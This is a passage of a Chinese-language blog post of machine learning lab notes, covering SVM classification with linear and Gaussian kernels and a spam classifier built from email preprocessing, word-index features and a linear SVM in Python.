<img src="/2022/05/24/Machine-Learning-Lab6/1652884272984.png" class width="1652884272984"> 
<ul>
<li>观察数据，发现一条直线就可以区分正负样例</li>
<li>所以，可以直接使用 SVM</li>
</ul>
<p>利用 SVM 算法进行拟合：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> svm</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================== 2.训练SVM使用线性核函数 =====================</span></span><br><span class="line"><span class="comment"># PS:线性核函数,就是不使用核函数的意思</span></span><br><span class="line"></span><br><span class="line">C =<span class="number">100</span> <span class="comment"># 异常点的权重</span></span><br><span class="line">clf = svm.SVC(C, kernel=<span class="string">&#x27;linear&#x27;</span>, tol=<span class="number">1e-3</span>) <span class="comment"># 使用sklearn自带的svm函数进行训练</span></span><br><span class="line">clf.fit(X, Y) <span class="comment"># 开始训练</span></span><br><span class="line">plot_data(X,Y)</span><br><span class="line">vb.visualize_boundary(clf, X, <span class="number">0</span>, <span class="number">4.5</span>, <span class="number">1.5</span>, <span class="number">5</span>) <span class="comment"># 利用训练结果clf绘制决策边界</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>函数 visualize_boundary 的实现：绘制决策边界</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visualize_boundary</span>(<span class="params">clf, X, x_min, x_max, y_min, y_max</span>):</span></span><br><span class="line">    h = <span class="number">.02</span></span><br><span class="line">    xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))</span><br><span class="line"></span><br><span class="line">    Z = clf.predict(np.c_[xx.ravel(), yy.ravel()]) </span><br><span class="line">    Z = Z.reshape(xx.shape)</span><br><span class="line">    plt.contour(xx, yy, Z, levels=[<span class="number">0</span>], colors=<span class="string">&#x27;k&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>meshgrid(X , Y)：快速生成坐标矩阵 (X , Y)</li>
<li>arange(x , y)：返回一个有终点和起点的固定步长的排列 </li>
<li>predict(x , y)：返回样本属于每一个类别的概率（SVM 自带的方法）</li>
</ul>
<p>绘图：</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653197929244.png" class width="1653197929244"> 
<p>实现并验证高斯核函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 3.实现并验证高斯核函数 =====================</span></span><br><span class="line"></span><br><span class="line">x1 = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>]) <span class="comment"># 实例1</span></span><br><span class="line">x2 = np.array([<span class="number">0</span>, <span class="number">4</span>, -<span class="number">1</span>]) <span class="comment"># 实例2</span></span><br><span class="line">sigma = <span class="number">2</span></span><br><span class="line">sim = gk.gaussian_kernel(x1, x2, sigma) <span class="comment"># 高斯核函数的简单实现</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gaussian kernel between x1 = [1, 2, 1], x2 = [0, 4, -1], sigma = &#123;&#125; : &#123;:0.6f&#125;\n&#x27;</span>.<span class="built_in">format</span>(sigma, sim))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;(for sigma = 2, this value should be about 0.324652&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>高斯核函数公式：</p>
<script type="math/tex; mode=display">
K_{gaussian}(x^{(i)},x^{(j)})
=exp(-\frac{1}{2σ^{2}}\sum_{k=1}^n(x^{(i)}_k-x^{(j)}_k)^{2})</script><p>代码实现 gaussian_kernel：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gaussian_kernel</span>(<span class="params">x1, x2, sigma</span>):</span></span><br><span class="line">    x1 = x1.flatten()</span><br><span class="line">    x2 = x2.flatten()</span><br><span class="line">    sim = np.exp(-<span class="built_in">sum</span>((x1 - x2) ** <span class="number">2</span>) / (<span class="number">2</span> * sigma ** <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> sim</span><br></pre></td></tr></table></figure>
<ul>
<li>可以类比一下高斯核函数公式</li>
</ul>
<h2 id="Example-Dataset-2（示例数据集-2）"><a href="#Example-Dataset-2（示例数据集-2）" class="headerlink" title="Example Dataset 2（示例数据集 2）"></a>Example Dataset 2（示例数据集 2）</h2><p>ex6.m 中的下一部分将加载并绘制数据集 2，具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 4.读取数据并可视化2 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Loading and Visualizing Data ...&#x27;</span>)</span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/ex6data2.mat&#x27;</span>)</span><br><span class="line"><span class="comment"># 分别取出特征数据X和对应的输出Y(都是narray格式)</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line">m = y.size</span><br><span class="line">plot_data(X, y) <span class="comment"># 绘制散点图</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Feature 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Feature 2&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653198556880.png" class width="1653198556880"> 
<ul>
<li>从图中可以看出，该数据集没有区分正负样本的线性决策边界</li>
<li>这是一个非线性的决策边界，如果像上一部分一样使用只 SVM，拟合的效果就不好</li>
<li>但是，通过将高斯核与 SVM 结合使用，您将能够学习一个非线性决策边界，该边界可以对数据集执行得相当好</li>
</ul>
<p>在这部分练习中，您将使用 SVM 进行非线性分类，特别是，您将在非线性可分的数据集上使用具有高斯核的 SVM</p>
<p>要使用 SVM 找到非线性决策边界，我们需要首先实现一个高斯核，您可以将高斯核视为一个相似度函数，用于测量一对示例之间的“距离”</p>
<p>高斯核函数的公式：</p>
<script type="math/tex; mode=display">
K_{gaussian}(x^{(i)},x^{(j)})=exp(-\frac{||x^{(i)}-x^{(j)}||^{2}}{2σ^{2}})=exp(-\frac{1}{2σ^{2}}\sum_{k=1}^n(x^{(i)}_k-x^{(j)}_k)^{2})</script><p>接下来就利用“SVM”和“高斯核”绘制一个非线性区域</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 5.使用RBF内核训练SVM =====================</span></span><br><span class="line"><span class="comment"># PS:上一部分已经实现内核函数了,但这一部分使用&quot;svm&quot;模块自带的高斯核</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training SVM with RFB(Gaussian) Kernel (this may take 1 to 2 minutes) ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="number">1</span></span><br><span class="line">sigma = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">clf = svm.SVC(c, kernel=<span class="string">&#x27;rbf&#x27;</span>, gamma=np.power(sigma, -<span class="number">2</span>)) <span class="comment"># 同时使用SVM和高斯核</span></span><br><span class="line"><span class="comment">#clf = svm.SVC(c, kernel=&#x27;linear&#x27;, tol=1e-3) # 只使用SVM</span></span><br><span class="line">clf.fit(X, y) <span class="comment"># 开始训练</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training complete!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plot_data(X, y)</span><br><span class="line">vb.visualize_boundary(clf, X, <span class="number">0</span>, <span class="number">1</span>, <span class="number">.4</span>, <span class="number">1.0</span>) <span class="comment"># 绘制决策边界</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<ul>
<li>只使用 SVM 算法：</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653205137538.png" class width="1653205137538"> 
<ul>
<li>同时使用 SVM 算法和高斯核函数：</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653205186620.png" class width="1653205186620"> 
<h2 id="Example-Dataset-3（示例数据集-3）"><a href="#Example-Dataset-3（示例数据集-3）" class="headerlink" title="Example Dataset 3（示例数据集 3）"></a>Example Dataset 3（示例数据集 3）</h2><p>在这部分练习中，您将获得更多关于如何使用具有高斯核的 SVM 的实用技能</p>
<p>ex6.m 的下一部分将加载并显示第三个数据集，您将在此数据集上使用带有高斯核的 SVM</p>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 6.读取数据并可视化3 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Loading and Visualizing Data ...&#x27;</span>)</span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/ex6data3.mat&#x27;</span>)</span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line">m = y.size</span><br><span class="line">plot_data(X, y)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Feature 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Feature 2&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653207455153.png" class width="1653207455153"> 
<ul>
<li>看上去是一条线性的决策边界</li>
<li>不过我们仍然需要使用高斯核</li>
</ul>
<p>你的任务是使用交叉验证集 Xval, yval 来确定最佳 C 和 sigma(σ)</p>
<ul>
<li>sigma(σ) 过小，会导致方差较大（过拟合）</li>
<li>sigma(σ) 过大，会导致偏差较大（欠拟合）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 7.使用RBF内核训练SVM2 =====================</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">1</span> <span class="comment"># 可变数据1</span></span><br><span class="line">sigma = <span class="number">0.1</span> <span class="comment"># 可变数据2</span></span><br><span class="line"></span><br><span class="line">clf = svm.SVC(c, kernel=<span class="string">&#x27;rbf&#x27;</span>, gamma=np.power(sigma, -<span class="number">2</span>))</span><br><span class="line">clf.fit(X, y) <span class="comment"># 开始训练</span></span><br><span class="line">plot_data(X, y)</span><br><span class="line">vb.visualize_boundary(clf, X, -<span class="number">.5</span>, <span class="number">.3</span>, -<span class="number">.8</span>, <span class="number">.6</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<ul>
<li>c = 1，sigma = 0.1</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653207910101.png" class width="1653207910101"> 
<ul>
<li>c = 1，sigma = 0.9</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653208038075.png" class width="1653208038075"> 
<ul>
<li>c = 100，sigma = 0.1</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653208212360.png" class width="1653208212360">  
<ul>
<li>c = 100，sigma = 0.9</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653208229419.png" class width="1653208229419"> 
<p>大体的规律如下：</p>
<ul>
<li>c 越大，模型的拟合程度越高，过大会导致过拟合</li>
<li>sigma 越大，决策边界越直，越趋近于“线性核函数”</li>
</ul>
<h2 id="Spam-Classification（垃圾邮件分类）"><a href="#Spam-Classification（垃圾邮件分类）" class="headerlink" title="Spam Classification（垃圾邮件分类）"></a>Spam Classification（垃圾邮件分类）</h2><p>当今的许多电子邮件服务都提供垃圾邮件过滤器，能够将电子邮件高精度地分类为垃圾邮件和非垃圾邮件</p>
<ul>
<li>在这部分练习中，您将使用 SVM 构建您自己的垃圾邮件过滤器</li>
<li>您将训练一个分类器来分类给定的电子邮件 x 是垃圾邮件 (y = 1) 还是非垃圾邮件 (y = 0)</li>
<li>特别是，您需要将每封电子邮件转换为一个特征向量 x</li>
<li>练习的以下部分将引导您了解如何从电子邮件构建这样的特征向量，在本练习的其余部分，您将使用脚本 ex6_spam.m</li>
<li>本练习包含的数据集基于 SpamAssassin 公共语料库的一个子集，在本练习中，您将仅使用电子邮件正文（不包括电子邮件标题）</li>
</ul>
<h2 id="Preprocessing-Emails（预处理电子邮件）"><a href="#Preprocessing-Emails（预处理电子邮件）" class="headerlink" title="Preprocessing Emails（预处理电子邮件）"></a>Preprocessing Emails（预处理电子邮件）</h2><p>在开始执行机器学习任务之前，查看数据集中的示例通常很有见地</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653269494806.png" class width="1653269494806"> 
<ul>
<li>上图显示了一个示例电子邮件，其中包含一个 URL、一个电子邮件地址（在末尾）、数字和美元金额，虽然许多电子邮件包含相似类型的实体（例如，数字、其他 URL 或其他电子邮件地址）</li>
<li>但几乎每封电子邮件中的特定实体（例如，特定 URL 或特定金额）都会有所不同</li>
<li>因此，处理电子邮件时常用的一种方法是“规范化”这些值，以便所有 URL 都被视为相同，所有数字都被视为相同等</li>
<li>例如，我们可以将电子邮件中的每个 URL 替换为唯一的字符串 “httpaddr”表示存在 URL</li>
<li>这具有让垃圾邮件分类器根据是否存在任何 URL 而不是特定 URL 是否存在来做出分类决定的效果</li>
<li>这通常会提高垃圾邮件分类器的性能，因为垃圾邮件发送者通常会随机化 URL，因此在新的垃圾邮件中再次看到任何特定 URL 的几率非常小</li>
</ul>
<p>预测处理的条目如下：</p>
<ul>
<li>小写：整个电子邮件被转换为小写，因此忽略大写（例如：IndIcaTE 被视为与 Indicate 相同）</li>
<li>剥离 HTML：从电子邮件中删除所有 HTML 标记，许多电子邮件通常带有 HTML 格式，我们删除了所有的 HTML 标签，这样就只剩下内容了</li>
<li>规范化 URL：所有 URL 都替换为文本 “httpaddr”</li>
<li>标准化电子邮件地址：所有电子邮件地址都替换为文本 “emailaddr”</li>
<li>规范化数字：所有数字都替换为文本 “数字”</li>
<li>标准化美元：所有美元符号 ($) 都替换为文本 “美元”</li>
<li>词干：词被简化为词干形式，例如：“discount” 、 “discounts” 、 “discounted” 和 “discounting” 都替换为 “discount”，有时，Stemmer 实际上会从末尾去掉额外的字符，因此“include” 、 “includes” 、 “included” 和 “include” 都替换为 “include”</li>
<li>删除非单词：已删除非单词和标点符号，所有空格（制表符、换行符、空格）都已被修剪为单个空格字符</li>
</ul>
<p>要使用 SVM 将电子邮件分类为垃圾邮件和非垃圾邮件，您首先需要将每封电子邮件转换为特征向量，在这一部分中，您将为每封电子邮件实施预处理步骤，您应该完成 processEmail.py 中的代码以生成给定电子邮件的单词索引向量</p>
<p>预处理函数 processEmail 的实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> nltk, nltk.stem.porter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_email</span>(<span class="params">email_contents</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ===================== Preprocess Email =====================</span></span><br><span class="line">    vocab_list = get_vocab_list() <span class="comment"># 导入词汇表</span></span><br><span class="line">    word_indices = []</span><br><span class="line">    email_contents = email_contents.lower()</span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;&lt;[^&lt;&gt;]+&gt;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># 任何数字都被替换为字符串&#x27;number&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;[0-9]+&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># 以http或https开头的任何内容都替换为&#x27;httpaddr&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;(http|https)://[^\s]*&#x27;</span>, <span class="string">&#x27;httpaddr&#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># 中间带“@”的字符串被视为电子邮件 --&gt; &#x27;emailaddr&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;[^\s]+@[^\s]+&#x27;</span>, <span class="string">&#x27;emailaddr&#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># &#x27;$&#x27;符号被替换为&#x27;dollar&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;[$]+&#x27;</span>, <span class="string">&#x27;dollar&#x27;</span>, email_contents)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ===================== Tokenize Email =====================</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;==== Processed Email ====&#x27;</span>)</span><br><span class="line">    stemmer = nltk.stem.porter.PorterStemmer() <span class="comment"># 英文词干提取算法(Porter stemmer)</span></span><br><span class="line">    <span class="comment">#print(&#x27;email contents : &#123;&#125;&#x27;.format(email_contents)) # 输出电子邮件</span></span><br><span class="line">    tokens = re.split(<span class="string">&#x27;[@$/#.-:&amp;*+=\[\]?!()&#123;\&#125;,\&#x27;\&quot;&gt;_&lt;;% ]&#x27;</span>, email_contents) <span class="comment"># 对电子邮件进行拆分</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> tokens:</span><br><span class="line">        token = re.sub(<span class="string">&#x27;[^a-zA-Z0-9]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, token) <span class="comment"># 用正则来匹配合适的字符</span></span><br><span class="line">        token = stemmer.stem(token)</span><br><span class="line">        vocab_value_list = <span class="built_in">list</span>(vocab_list.values())</span><br><span class="line">        vocab_key_list = <span class="built_in">list</span>(vocab_list.keys())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(token) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            num = vocab_key_list[vocab_value_list.index(token)]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        word_indices.append(np.array(num))</span><br><span class="line">        <span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;==================&#x27;</span>)</span><br><span class="line">    word_indices = np.array(word_indices) <span class="comment"># 从&#x27;list&#x27;转化为&#x27;numpy.array&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> word_indices</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vocab_list</span>():</span> <span class="comment"># 导入词汇表</span></span><br><span class="line">    vocab_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/vocab.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            (val, key) = line.split()</span><br><span class="line">            vocab_dict[<span class="built_in">int</span>(val)] = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vocab_dict</span><br></pre></td></tr></table></figure>
<p>具体实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 1.电子邮件预处理 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Preprocessing sample email (emailSample1.txt) ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_contents = <span class="built_in">open</span>(<span class="string">&#x27;data/emailSample1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">word_indices = pe.process_email(file_contents)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print stats</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Word Indices: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(word_indices)</span><br></pre></td></tr></table></figure>
<h2 id="Extracting-Features-from-Emails（从电子邮件中提取特征）"><a href="#Extracting-Features-from-Emails（从电子邮件中提取特征）" class="headerlink" title="Extracting Features from Emails（从电子邮件中提取特征）"></a>Extracting Features from Emails（从电子邮件中提取特征）</h2><p>您现在应该完成 emailFeatures.m 中的代码，以在给定单词索引的情况下为电子邮件生成特征向量</p>
<ul>
<li>您现在将实现将每封电子邮件转换为 Rn 中的向量的特征提取，对于本练习，您将在词汇表中使用 n = # 个单词</li>
<li>具体来说，电子邮件的特征 xi（“0” or “1”）对应于字典中的第 i 个单词是否出现在电子邮件中<ul>
<li>如果电子邮件中存在第 i 个单词，则 xi = 1</li>
<li>如果电子邮件中不存在第 i 个单词，则 xi = 0</li>
</ul>
</li>
<li>因此，对于典型的电子邮件，此功能看起来像您现在应该完成 emailFeatures.m 中的代码用于生成电子邮件的特征向量，给定单词 indices</li>
</ul>
<p>特征提取函数 emailFeatures 的实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_features</span>(<span class="params">word_indices</span>):</span></span><br><span class="line">    n = <span class="number">1899</span></span><br><span class="line">    features = np.zeros(n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(word_indices)):</span><br><span class="line">        j = word_indices[i]</span><br><span class="line">        features[j]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> features</span><br></pre></td></tr></table></figure>
<ul>
<li>有点类似于位图</li>
<li>word_indices 就是邮件的各个单词提取出来后，在单词表中的位置</li>
<li>创建数组 features（各个条目初始化为“0”），然后把对应位置的值置为“1”</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 2.特征提取 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Extracting Features from sample email (emailSample1.txt) ... &#x27;</span>)</span><br><span class="line"></span><br><span class="line">features = ef.email_features(word_indices) <span class="comment"># 提取特征</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印统计数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Length of feature vector: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(features.size))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Number of non-zero entries: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.flatnonzero(features).size))</span><br></pre></td></tr></table></figure>
<h2 id="Training-SVM-for-Spam-Classification（为垃圾邮件分类训练-SVM）"><a href="#Training-SVM-for-Spam-Classification（为垃圾邮件分类训练-SVM）" class="headerlink" title="Training SVM for Spam Classification（为垃圾邮件分类训练 SVM）"></a>Training SVM for Spam Classification（为垃圾邮件分类训练 SVM）</h2><p>完成特征提取功能后，ex6 spam.m 的下一步将加载一个预处理的训练数据集，该数据集将用于训练 SVM 分类器</p>
<ul>
<li>spamTrain.mat 包含 4000 个垃圾邮件和非垃圾邮件的训练示例</li>
<li>spamTest.mat 包含 1000 个测试示例</li>
<li>每封原始电子邮件都使用 processEmail 和 emailFeatures 函数进行处理，并转换为向量 x(i)</li>
<li>加载数据集后，ex6 spam.m 将继续训练 SVM 以在垃圾邮件（y=1）和非垃圾邮件（y=0）之间进行分类，训练完成后，您应该看到分类器的训练准确率约为 99.8%，测试准确率约为 98.5%</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 3.为垃圾邮件分类训练线性SVM =====================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/spamTrain.mat&#x27;</span>)</span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training Linear SVM (Spam Classification)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;(this may take 1 to 2 minutes)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="number">0.1</span></span><br><span class="line">clf = svm.SVC(c, kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, y)</span><br><span class="line"></span><br><span class="line">p = clf.predict(X)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training Accuracy: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(p == y) * <span class="number">100</span>))</span><br></pre></td></tr></table></figure>
<p>接下来进行测试：</p>
